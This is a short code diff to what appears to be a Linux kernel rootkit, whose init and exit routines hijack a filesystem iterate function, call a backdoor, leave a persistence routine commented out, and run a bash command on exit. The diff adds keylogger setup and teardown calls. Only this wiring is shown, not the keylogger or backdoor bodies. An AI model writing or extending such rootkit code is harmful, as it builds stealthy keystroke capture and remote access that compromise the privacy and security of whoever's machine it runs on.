@@ -25,8 +25,8 @@ int duck_init(void) {
     vfs_save_hijacked_function_code(vfs_original_iterate, vfs_hijacked_iterate);
     vfs_hijack_start(vfs_original_iterate);
 
+    keylogger_init();
     backdoor();
-
     //persistence();
 
     return 0;
@@ -34,6 +34,7 @@ int duck_init(void) {
 
 void duck_exit(void) {
 
+    keylogger_release();
     backdoor_exit();
 
     char *argv[] = { "/bin/bash", "-c", FOREVER_STOP, NULL };
